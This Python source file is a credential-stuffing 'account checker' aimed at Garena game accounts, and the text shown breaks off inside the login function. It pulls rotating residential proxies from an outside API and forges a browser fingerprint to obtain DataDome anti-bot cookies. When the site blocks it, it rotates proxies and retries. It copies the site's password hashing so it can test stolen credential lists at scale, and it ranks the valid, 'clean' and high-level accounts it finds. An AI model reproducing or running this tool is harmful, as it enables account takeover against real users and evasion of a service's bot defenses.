#!/usr/bin/env python3
# Account Checker – uses Proxy Pool API for residential proxies
# Revamped: silent proxy rotation, new banner, table file selector, live stats

import os, sys, time, random, hashlib, re, json, logging, urllib.parse, signal
from datetime import datetime, timezone, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from Cryptodome.Cipher import AES
import requests as req_sync
import cloudscraper
import colorama, threading
from colorama import Fore, Style
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.box import DOUBLE, ROUNDED, HEAVY
from rich.live import Live
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeRemainingColumn
from rich import box
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.align import Align
from rich.columns import Columns

# ================================
# 🌍 Proxy Pool API Setup
# ================================
API_BASE = "https://proxies-restocker.onrender.com/api"
CURRENT_PROXY_STRING = None
PROXIES = {}
proxy_lock = Lock()

def parse_proxy_string(proxy_str):
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    return None

def get_proxy_from_api():
    global CURRENT_PROXY_STRING
    try:
        resp = req_sync.get(f"{API_BASE}/proxy", timeout=5)
        data = resp.json()
        if 'proxy' in data:
            CURRENT_PROXY_STRING = data['proxy']
            proxy_url = parse_proxy_string(CURRENT_PROXY_STRING)
            if proxy_url:
                return {"http": proxy_url, "https": proxy_url}
    except Exception as e:
        logging.error(f"Failed to get proxy from API: {e}")
    return None

def block_current_proxy():
    if not CURRENT_PROXY_STRING:
        return
    try:
        payload = {"proxy": CURRENT_PROXY_STRING}
        req_sync.post(f"{API_BASE}/proxy/block", json=payload, timeout=5)
        logging.info(f"📛 Marked proxy as blocked: {CURRENT_PROXY_STRING[:30]}...")
    except Exception as e:
        logging.error(f"Could not block proxy: {e}")

def refresh_proxy():
    block_current_proxy()
    return get_proxy_from_api()

def update_session_proxies(session, new_proxies):
    with proxy_lock:
        if new_proxies:
            session.proxies.clear()
            session.proxies.update(new_proxies)
            return True
    return False

# ================================
# 🎨 Termux Theme (optional)
# ================================
def setup_termux_theme():
    if not (os.getenv("TERMUX_VERSION") or os.getenv("ANDROID_ROOT")):
        return
    config_dir = os.path.expanduser("~/.termux")
    config_path = os.path.join(config_dir, "colors.properties")
    desired_theme = """background=#2a1f26
foreground=#f2d5e9
cursor=#f2d5e9
"""
    try:
        os.makedirs(config_dir, exist_ok=True)
        if not os.path.exists(config_path) or open(config_path).read() != desired_theme:
            with open(config_path, "w") as f:
                f.write(desired_theme)
            os.system("termux-reload-settings")
            print(Fore.GREEN + "✅ Termux theme set" + Style.RESET_ALL)
    except:
        pass

setup_termux_theme()

# ================================
# 🎨 Console & Emojis
# ================================
console = Console()
colorama.init(autoreset=True)

EMOJI = {
    "success": "✅", "error": "❌", "warning": "⚠️", "info": "ℹ️",
    "rocket": "🚀", "gear": "⚙️", "check": "✔️", "cross": "✖️",
    "star": "⭐", "fire": "🔥", "crown": "👑", "game": "🎮",
    "phone": "📱", "email": "📧", "lock": "🔒", "unlock": "🔓",
    "globe": "🌍", "flag": "🏁", "hourglass": "⌛", "stop": "🛑",
    "play": "▶️", "pause": "⏸️", "refresh": "🔄", "database": "💾",
    "folder": "📁", "file": "📄", "key": "🔑", "shield": "🛡️",
    "target": "🎯", "trophy": "🏆", "chart": "📊", "bell": "🔔",
    "mute": "🔕", "telegram": "📱", "network": "🌐", "ip": "🌍",
    "cookie": "🍪", "banned": "🚫", "one": "1️⃣", "two": "2️⃣",
    "three": "3️⃣", "four": "4️⃣", "line": "─", "clock": "⏰",
    "robot": "🤖", "chat": "💬", "question": "❓", "calendar": "📅"
}

account_counter = {"count": 0, "total": 0}
counter_lock = Lock()
file_lock = Lock()
live_display = None   # will hold the Live context
CHECK_OTHER_GAMES = False

# ================================
# 🌈 Revamped Banner
# ================================
def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    title = Text("GARENA ACCOUNT CHECKER", style="bold cyan")
    subtitle = Text("Proxy‑powered • Multi‑game scanner", style="dim white")
    panel = Panel(
        Align.center(Columns([title, subtitle], align="center")),
        border_style="bright_cyan",
        box=ROUNDED,
        padding=(1, 4)
    )
    console.print(panel)
    console.print()

# ================================
# 🛑 Signal Handler
# ================================
shutdown_event = Event()

def signal_handler(signum, frame):
    print(f"\n  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}")
    print(f"  {Fore.YELLOW}{EMOJI['stop']} ⚠️  Interrupted by user - Exiting immediately{Style.RESET_ALL}")
    print(f"  {Fore.LIGHTCYAN_EX}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Style.RESET_ALL}\n")
    os._exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ================================
# 🎨 Color & Logging Setup
# ================================
class Colors:
    LIGHTGREEN_EX = Fore.LIGHTGREEN_EX; LIGHTCYAN_EX = Fore.LIGHTCYAN_EX; LIGHTYELLOW_EX = Fore.LIGHTYELLOW_EX
    LIGHTRED_EX = Fore.LIGHTRED_EX; LIGHTBLUE_EX = Fore.LIGHTBLUE_EX; LIGHTWHITE_EX = Fore.LIGHTWHITE_EX
    LIGHTBLACK_EX = Fore.LIGHTBLACK_EX; WHITE = Fore.WHITE; BLUE = Fore.BLUE; GREEN = Fore.GREEN
    RED = Fore.RED; CYAN = Fore.CYAN; YELLOW = Fore.YELLOW; MAGENTA = Fore.MAGENTA; RESET = Style.RESET_ALL

class ColoredFormatter(logging.Formatter):
    COLORS = {'DEBUG': Fore.BLUE, 'INFO': Fore.GREEN, 'WARNING': Fore.YELLOW, 'ERROR': Fore.RED,
              'CRITICAL': Fore.RED, 'ORANGE': '\033[38;5;214m', 'PURPLE': '\033[95m',
              'CYAN': '\033[96m', 'SUCCESS': '\033[92m', 'FAIL': '\033[91m'}
    RESET = Style.RESET_ALL
    def format(self, record):
        if record.levelname in self.COLORS:
            record.msg = f"{self.COLORS[record.levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

class GracefulThreadPoolExecutor(ThreadPoolExecutor):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._shutdown = False
    def shutdown(self, wait=True, *, cancel_futures=False):
        self._shutdown = True
        super().shutdown(wait=wait, cancel_futures=cancel_futures)

# ================================
# 🍪 Cookie & DataDome Managers (mostly unchanged)
# ================================
class CookieManager:
    def __init__(self):
        self.banned_cookies = set()
        if os.path.exists('banned_cookies.txt'):
            with open('banned_cookies.txt', 'r') as f:
                self.banned_cookies = set(line.strip() for line in f if line.strip())
    def is_banned(self, cookie): return cookie in self.banned_cookies
    def mark_banned(self, cookie):
        self.banned_cookies.add(cookie)
        with open('banned_cookies.txt', 'a') as f: f.write(cookie + '\n')
    def get_valid_cookies(self):
        valid = []
        if os.path.exists('fresh_cookie.txt'):
            with open('fresh_cookie.txt', 'r') as f:
                valid = [c.strip() for c in f.read().splitlines() if c.strip() and not self.is_banned(c.strip())]
        random.shuffle(valid)
        return valid
    def save_cookie(self, datadome_value):
        formatted = f"datadome={datadome_value.strip()}"
        if not self.is_banned(formatted):
            existing = set()
            if os.path.exists('fresh_cookie.txt'):
                with open('fresh_cookie.txt', 'r') as f:
                    existing = set(line.strip() for line in f if line.strip())
            if formatted not in existing:
                with open('fresh_cookie.txt', 'a') as f: f.write(formatted + '\n')
                return True
        return False

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self._403_attempts = 0
        self._blocked = False
    def set_datadome(self, cookie): self.current_datadome = cookie
    def get_datadome(self): return self.current_datadome
    def extract_datadome_from_session(self, session):
        try:
            cookie = session.cookies.get_dict().get('datadome')
            if cookie: self.set_datadome(cookie)
            return cookie
        except: return None
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies: del session.cookies['datadome']
        except: pass
    def set_session_datadome(self, session, cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
        except: return False
    def get_current_ip(self):
        for service in ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']:
            try:
                response = req_sync.get(service, timeout=10, proxies=PROXIES)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip: return ip
            except: continue
        return None
    def fetch_fresh_datadome_with_retry(self, session, max_retries=5):
        for attempt in range(1, max_retries+1):
            try:
                logger.info(f"{EMOJI['refresh']} 🔄 Fetching fresh DataDome cookie (attempt {attempt}/{max_retries})...")
                fresh_session = cloudscraper.create_scraper()
                fresh_session.proxies.update(PROXIES)
                new_datadome = get_datadome_cookie(fresh_session)
                if new_datadome:
                    logger.info(f"{EMOJI['success']} ✅ Fresh DataDome cookie obtained: {new_datadome[:20]}...")
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                    return True
                else: logger.warning(f"{EMOJI['warning']} ⚠️  Attempt {attempt}: Failed to get DataDome cookie")
            except Exception as e: logger.error(f"{EMOJI['error']} ❌ Attempt {attempt}: Error - {str(e)[:50]}")
            if attempt < max_retries:
                wait_time = 2 ** attempt
                logger.info(f"{EMOJI['hourglass']} ⏳ Waiting {wait_time} seconds before retry...")
                time.sleep(wait_time)
        logger.error(f"{EMOJI['error']} ❌ Failed to fetch DataDome cookie after {max_retries} attempts")
        return False
    def handle_403(self, session):
        """Now automatically rotates proxy via API and fetches new DataDome."""
        self._403_attempts += 1
        logger.info(f"{EMOJI['refresh']} 🔄 403 encountered – rotating residential proxy via API...")
        new_proxies = refresh_proxy()
        if update_session_proxies(session, new_proxies):
            logger.info("✅ Proxy switched. Fetching fresh DataDome cookie...")
            if self.fetch_fresh_datadome_with_retry(session):
                self._403_attempts = 0
                self._blocked = False
                return True
        # If proxy rotation fails, fallback to IP change detection (unlikely)
        logger.warning("Proxy rotation failed, falling back to IP change detection...")
        if self.wait_for_ip_change(session):
            self._403_attempts = 0
            self._blocked = False
            return True
        return False
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=300):
        logger.info(f"{EMOJI['refresh']} 🔄 Auto-detecting IP change...")
        original_ip = self.get_current_ip()
        if not original_ip:
            logger.warning(f"{EMOJI['warning']} Could not determine current IP")
            time.sleep(10)
            return self.fetch_fresh_datadome_with_retry(session)
        logger.info(f"{EMOJI['ip']} 📍 Current IP: {original_ip}")
        logger.info(f"{EMOJI['hourglass']} ⏳ Waiting for IP change (checking every {check_interval}s, max {max_wait_time//60} minutes)...")
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            current_ip = self.get_current_ip()
            if current_ip and current_ip != original_ip:
                logger.info(f"{EMOJI['success']} ✅ IP changed from {original_ip} to {current_ip}")
                if self.fetch_fresh_datadome_with_retry(session):
                    return True
                return False
            time.sleep(check_interval)
        logger.warning(f"{EMOJI['warning']} ⚠️  IP did not change after {max_wait_time} seconds")
        return self.fetch_fresh_datadome_with_retry(session)
    def is_blocked(self): return self._blocked
    def reset_attempts(self): self._403_attempts = 0; self._blocked = False

def get_country_emoji(country_code):
    emojis = {'PH':'🇵🇭','ID':'🇮🇩','TH':'🇹🇭','VN':'🇻🇳','MY':'🇲🇾','SG':'🇸🇬','TW':'🇹🇼','BR':'🇧🇷','IN':'🇮🇳','US':'🇺🇸','GB':'🇬🇧','CN':'🇨🇳','JP':'🇯🇵','KR':'🇰🇷','AU':'🇦🇺','CA':'🇨🇦','DE':'🇩🇪','FR':'🇫🇷','IT':'🇮🇹','ES':'🇪🇸','MX':'🇲🇽','RU':'🇷🇺','SA':'🇸🇦','AE':'🇦🇪','NL':'🇳🇱','SE':'🇸🇪','NO':'🇳🇴','DK':'🇩🇰','FI':'🇫🇮','PL':'🇵🇱','TR':'🇹🇷','EG':'🇪🇬','ZA':'🇿🇦','NG':'🇳🇬','KE':'🇰🇪','AR':'🇦🇷','CL':'🇨🇱','CO':'🇨🇴','PE':'🇵🇪','VE':'🇻🇪','NZ':'🇳🇿','PT':'🇵🇹','GR':'🇬🇷','CZ':'🇨🇿','HU':'🇭🇺','RO':'🇷🇴','AT':'🇦🇹','CH':'🇨🇭','BE':'🇧🇪','IE':'🇮🇪','UA':'🇺🇦','IL':'🇮🇱','PK':'🇵🇰','BD':'🇧🇩','LK':'🇱🇰','MM':'🇲🇲','KH':'🇰🇭','LA':'🇱🇦','HK':'🇭🇰','MO':'🇲🇴'}
    return emojis.get(country_code.upper(), '🌍')

# ================================
# 📊 LiveStats – now generates a Rich panel
# ================================
class LiveStats:
    def __init__(self):
        self.valid_count = 0
        self.invalid_count = 0
        self.clean_count = 0
        self.not_clean_count = 0
        self.has_codm_count = 0
        self.no_codm_count = 0
        self.check_count = 0
        self.highest_clean_level = 0
        self.highest_level = 0
        self.country_stats = {}
        self.top_accounts = []
        self.all_levels = []
        self.game_counts = {
            'CODM':0, 'FREEFIRE':0, 'ROV':0, 'DELTA FORCE':0, 'AOV':0,
            'SPEED DRIFTERS':0, 'BLACK CLOVER M':0, 'GARENA UNDAWN':0,
            'FC ONLINE':0, 'FC ONLINE M':0, 'MOONLIGHT BLADE':0,
            'FAST THRILL':0, 'THE WORLD OF WAR':0, 'FREE FIRE':0,
        }
        self.lock = threading.Lock()

    def update_stats(self, valid=False, clean=False, has_codm=False, codm_level=None,
                     is_leaked=False, country=None, ign=None, account=None, game_connections=None):
        with self.lock:
            self.check_count += 1
            if not valid:
                self.invalid_count += 1
                return
            self.valid_count += 1
            if not has_codm:
                self.no_codm_count += 1
                return
            self.has_codm_count += 1
            if codm_level and codm_level > self.highest_level:
                self.highest_level = codm_level
            if clean:
                self.clean_count += 1
                if codm_level and codm_level > self.highest_clean_level:
                    self.highest_clean_level = codm_level
            else:
                self.not_clean_count += 1
            if codm_level:
                self.all_levels.append(codm_level)
            if codm_level and country and ign:
                self.top_accounts.append({
                    'level': codm_level, 'country': country, 'ign': ign,
                    'clean': clean, 'account': account
                })
                self.top_accounts.sort(key=lambda x: x['level'], reverse=True)
                self.top_accounts = self.top_accounts[:3]
            if country:
                if country not in self.country_stats:
                    self.country_stats[country] = {'clean':0, 'not_clean':0}
                if clean: self.country_stats[country]['clean'] += 1
                else: self.country_stats[country]['not_clean'] += 1
            if game_connections:
                for g in game_connections:
                    gname = g.get('game', '').upper()
                    if gname == 'FREE FIRE': gname = 'FREEFIRE'
                    if gname in self.game_counts:
                        self.game_counts[gname] += 1

    def get_stats(self):
        with self.lock:
            return {
                'valid': self.valid_count, 'invalid': self.invalid_count,
                'clean': self.clean_count, 'not_clean': self.not_clean_count,
                'has_codm': self.has_codm_count, 'no_codm': self.no_codm_count,
                'check_count': self.check_count, 'highest_clean_level': self.highest_clean_level,
                'highest_level': self.highest_level, 'country_stats': dict(self.country_stats),
                'top_accounts': list(self.top_accounts), 'all_levels': list(self.all_levels),
                'game_counts': dict(self.game_counts),
            }

    def generate_live_panel(self):
        """Create a rich Panel with current statistics for Live display."""
        stats = self.get_stats()
        table = Table.grid(padding=(0, 2))
        table.add_column(style="bold white", justify="right")
        table.add_column(style="cyan")
        table.add_row("Checked:", str(stats['check_count']))
        table.add_row("Valid:", str(stats['valid']))
        table.add_row("Invalid:", str(stats['invalid']))
        table.add_row("CODM:", str(stats['has_codm']))
        table.add_row("Clean:", str(stats['clean']))
        table.add_row("Not Clean:", str(stats['not_clean']))
        table.add_row("Highest Lvl:", str(stats['highest_level']))
        table.add_row("Highest Clean:", str(stats['highest_clean_level']))
        return Panel(table, title="[bold cyan]Live Statistics[/bold cyan]", border_style="cyan", box=ROUNDED)

    def display_final_summary(self):
        # unchanged final summary (still prints detailed breakdown)
        stats = self.get_stats()
        console.print("\n" * 2)
        console.print(Panel(Text(f"{EMOJI['flag']} CHECKING COMPLETE {EMOJI['flag']}", style="bold cyan", justify="center"), border_style="cyan", box=DOUBLE))
        console.print()
        summary_text = f"{EMOJI['database']} [bold white]Total:[/bold white] [cyan]{stats['check_count']}[/cyan] | "
        summary_text += f"{EMOJI['success']} [bold white]Valid:[/bold white] [green]{stats['valid']}[/green] | "
        summary_text += f"{EMOJI['error']} [bold white]Invalid:[/bold white] [red]{stats['invalid']}[/red] | "
        summary_text += f"{EMOJI['game']} [bold white]CODM:[/bold white] [cyan]{stats['has_codm']}[/cyan] | "
        summary_text += f"{EMOJI['check']} [bold white]Clean:[/bold white] [green]{stats['clean']}[/green] | "
        summary_text += f"{EMOJI['cross']} [bold white]Not Clean:[/bold white] [red]{stats['not_clean']}[/red]"
        console.print(Panel(summary_text, style="bold green", title=f"{EMOJI['chart']} Final Summary", box=DOUBLE))
        gc = stats['game_counts']
        game_display_names = [
            ('CODM','CODM'),('FREEFIRE','Free Fire'),('ROV','ROV'),('DELTA FORCE','Delta Force'),
            ('AOV','AOV'),('SPEED DRIFTERS','Speed Drifters'),('BLACK CLOVER M','Black Clover M'),
            ('GARENA UNDAWN','Undawn'),('FC ONLINE','FC Online'),('FC ONLINE M','FC Online M'),
            ('MOONLIGHT BLADE','Moonlight Blade'),('FAST THRILL','Fast Thrill'),('THE WORLD OF WAR','World of War')
        ]
        game_text = ""
        for key, label in game_display_names:
            count = gc.get(key, 0)
            color = "cyan" if count > 0 else "white"
            game_text += f"[bold white]{label}:[/bold white] [{color}]{count}[/{color}]   "
        console.print(Panel(game_text.strip(), style="bold cyan", title=f"{EMOJI['game']} Game Connections Found", box=DOUBLE))
        if stats['top_accounts']:
            top_text = ""
            for idx, acc in enumerate(stats['top_accounts'], 1):
                country_emoji = get_country_emoji(acc['country'])
                status = "[green]CLEAN[/green]" if acc['clean'] else "[red]NOT CLEAN[/red]"
                top_text += f"{EMOJI['crown']} [bold yellow]#{idx}.[/bold yellow] [cyan]{acc['country']} {country_emoji}[/cyan] | [bold white]Lvl {acc['level']}[/bold white] | [yellow]{acc['ign']}[/yellow] | {status}\n"
            console.print(Panel(top_text.strip(), style="bold cyan", title=f"{EMOJI['trophy']} Top 3 Highest Level", box=DOUBLE))
        if stats['country_stats']:
            country_text = ""
            sorted_countries = sorted(stats['country_stats'].items(), key=lambda x: x[1]['clean']+x[1]['not_clean'], reverse=True)
            for country, counts in sorted_countries:
                country_emoji = get_country_emoji(country)
                total = counts['clean']+counts['not_clean']
                country_text += f"{country_emoji} [cyan]{country}[/cyan]: [green]{counts['clean']} Clean[/green] | [red]{counts['not_clean']} Not Clean[/red] | [white]Total: {total}[/white]\n"
            console.print(Panel(country_text.strip(), style="bold yellow", title=f"{EMOJI['globe']} Country Distribution", box=DOUBLE))
        all_levels = stats.get('all_levels', [])
        level_ranges = {'1-39':0,'40-59':0,'60-79':0,'80-99':0,'100-199':0,'200-299':0,'300-400':0}
        for level in all_levels:
            if 1<=level<=39: level_ranges['1-39']+=1
            elif 40<=level<=59: level_ranges['40-59']+=1
            elif 60<=level<=79: level_ranges['60-79']+=1
            elif 80<=level<=99: level_ranges['80-99']+=1
            elif 100<=level<=199: level_ranges['100-199']+=1
            elif 200<=level<=299: level_ranges['200-299']+=1
            elif 300<=level<=400: level_ranges['300-400']+=1
        if any(level_ranges.values()):
            level_text = ""
            for range_name, count in level_ranges.items():
                color = "cyan" if count>0 else "white"
                level_text += f"[yellow]Lv {range_name}:[/yellow] [{color}]{count}[/{color}]   "
            console.print(Panel(level_text.strip(), style="bold magenta", title=f"{EMOJI['chart']} Level Distribution", box=DOUBLE))
        console.print()
        console.print(Panel(f"{EMOJI['folder']} [bold green]All results saved in:[/bold green] [cyan]results/[/cyan]", border_style="green", box=ROUNDED))
        console.print("\n")

# ================================
# 🔐 Crypto & Login Functions (unchanged)
# ================================
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(plaintext).hex()[:32]

def get_passmd5(password):
    return hashlib.md5(urllib.parse.unquote(password).encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                if key.strip() and value.strip():
                    cookie_dict[key.strip()] = value.strip()
            except: pass
    if cookie_dict:
        session.cookies.update(cookie_dict)
        logger.info(f"{EMOJI['success']} Applied {len(cookie_dict)} cookie keys.")
    else:
        logger.warning(f"{EMOJI['warning']} No valid cookies found")

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*', 'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'referer': 'https://account.garena.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36'
    }
    payload = {
        "jsData": json.dumps({"ttst":76.7,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,
            "ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/129.0.0.0 Safari/537.36",
            "wbd":False,"dp0":True,"tagpu":5.73,"wdifrm":False,"npmtm":False,"br_h":738,
            "br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,
            "nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,
            "str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,
            "plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,
            "hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,
            "lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,
            "vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf",
            "plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF",
            "hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably",
            "acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,
            "acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,
            "acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably",
            "acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,
            "vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,
            "vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,
            "dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,
            "tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters':'[]','jsType':'ch',
        'cid':'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk':'AE3F04AD3F0D3A462481A337485081','Referer':'https://account.garena.com/','request':'/',
        'responsePage':'origin','ddv':'4.35.4'
    }
    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k,v in payload.items())
    try:
        response = req_sync.post(url, headers=headers, data=data, timeout=15, proxies=PROXIES)
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
    except Exception as e:
        logger.error(f"{EMOJI['error']} Error getting DataDome: {e}")
    return None

def prelogin(session, account, datadome_manager):
    url = 'https://sso.garena.com/api/prelogin'
    try:
        account.encode('latin-1')
    except UnicodeEncodeError:
        logger.warning(f"{EMOJI['warning']} Skipping: {account} (unsupported characters)")
        return None, None, None
    params = {'app_id':'10100','account':account,'format':'json','id':str(int(time.time()*1000))}
    retries = 3
    for attempt in range(retries):
        try:
            current_cookies = session.cookies.get_dict()
            cookie_parts = [f"{name}={current_cookies[name]}" for name in ['apple_state_key','datadome','sso_key'] if name in current_cookies]
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            headers = {
                'accept':'application/json, text/plain, */*','accept-encoding':'gzip, deflate, br, zstd',
                'accept-language':'en-US,en;q=0.9','connection':'keep-alive','host':'sso.garena.com',
                'referer':f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua':'"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty',
                'sec-fetch-mode':'cors','sec-fetch-site':'same-origin',
                'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            if cookie_header: headers['cookie'] = cookie_header
            if attempt>0: logger.info(f"{EMOJI['refresh']} Retry {attempt+1}/{retries}")
            response = session.get(url, headers=headers, params=params, timeout=30)
            new_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            name = cookie_str.split('=')[0].strip()
                            value = cookie_str.split('=')[1].split(';')[0].strip()
                            if name and value: new_cookies[name] = value
                        except: pass
            try:
                response_cookies = response.cookies.get_dict()
                for name,value in response_cookies.items():
                    if name not in new_cookies: new_cookies[name] = value
            except: pass
            for name,value in new_cookies.items():
                if name in ['datadome','apple_state_key','sso_key']:
                    session.cookies.set(name, value, domain='.garena.com')
                    if name=='datadome': datadome_manager.set_datadome(value)
            new_datadome = new_cookies.get('datadome')
            if response.status_code == 403:
                logger.error(f"{EMOJI['error']} 🚫 Access denied (403)")
                if new_cookies and attempt<retries-1:
                    logger.info(f"{EMOJI['refresh']} Retrying with new cookies...")
                    time.sleep(2)
                    continue
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"{EMOJI['error']} 🚨 IP blocked - cannot continue")
                    return None, None, new_datadome
            response.raise_for_status()
            data = response.json()
            if 'error' in data:
                logger.error(f"{EMOJI['error']} Error: {data['error']}")
                return None, None, new_datadome
            v1 = data.get('v1'); v2 = data.get('v2')
            if not v1 or not v2:
                logger.error(f"{EMOJI['error']} Missing authentication data")
                return None, None, new_datadome
            logger.info(f"{EMOJI['success']} ✔ Prelogin successful")
            return v1, v2, new_datadome
        except requests.exceptions.HTTPError as e:
            if hasattr(e,'response') and e.response and e.response.status_code==403:
                logger.error(f"{EMOJI['error']} 🚫 Access denied (403)")
                new_cookies = {}
                if 'set-cookie' in e.response.headers:
                    for cookie_str in e.response.headers['set-cookie'].split(','):
                        if '=' in cookie_str:
                            try:
                                name = cookie_str.split('=')[0].strip()
                                value = cookie_str.split('=')[1].split(';')[0].strip()
                                if name and value:
                                    new_cookies[name] = value
                                    session.cookies.set(name, value, domain='.garena.com')
                                    if name=='datadome': datadome_manager.set_datadome(value)
                            except: pass
                if new_cookies and attempt<retries-1:
                    logger.info(f"{EMOJI['refresh']} Retrying with new cookies...")
                    time.sleep(2)
                    continue
                if datadome_manager.handle_403(session):
                    return "IP_BLOCKED", None, None
                else:
                    logger.error(f"{EMOJI['error']} 🚨 IP blocked - cannot continue")
                    return None, None, new_cookies.get('datadome')
            else:
                logger.error(f"{EMOJI['error']} HTTP error")
        except Exception as e:
            logger.error(f"{EMOJI['error']} Unexpected: {str(e)[:50]}")
            if attempt<retries-1: time.sleep(2)
    return None, None, None

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {'app_id':'10100','account':account,'password':hashed_password,
              'redirect_uri':'https://account.garena.com/','format':'json','id':str(int(time.time()*1000))}
    current_cookies = session.cookies.get_dict()
    cookie_parts = [f"{name}={current_cookies[name]}" for name in ['apple_state_key','datadome','sso_key'] if name in current_cookies]
    cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
    headers = {'accept':'application/json, text/plain, */*','referer':'https://account.garena.com/',
               'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
    if cookie_header: headers['cookie'] = cookie_header
    retries = 3
    for attempt in range(retries):
        try:
            response = session.get(url, headers=headers, params=params, timeout=30)
            response.raise_for_status()
            login_cookies = {}
            if 'set-cookie' in response.headers:
                for cookie_str in response.headers['set-cookie'].split(','):
                    if '=' in cookie_str:
                        try:
                            name = cookie_str.split('=')[0].strip()
                            value = cookie_str.split('=')[1].split(';')[0].strip()
                            if name and value: login_cookies[name] = value
                        except: pass
            try:
                response_cookies = response.cookies.get_dict()
                for name,value in response_cookies.items():
                    if name not in login_cookies: login_cookies[name] = value
            except: pass
            for name,value in login_cookies.items():
                if name in ['sso_key','apple_state_key','datadome']:
                    session.cookies.set(name, value, domain='.garena.com')
            data = response.json()
            sso_key = login_cookies.get('sso_key') or response.cookies.get('sso_key')
            if 'error' in data:
                error_msg = data['error']
                if error_msg == 'ACCOUNT DOESNT EXIST':
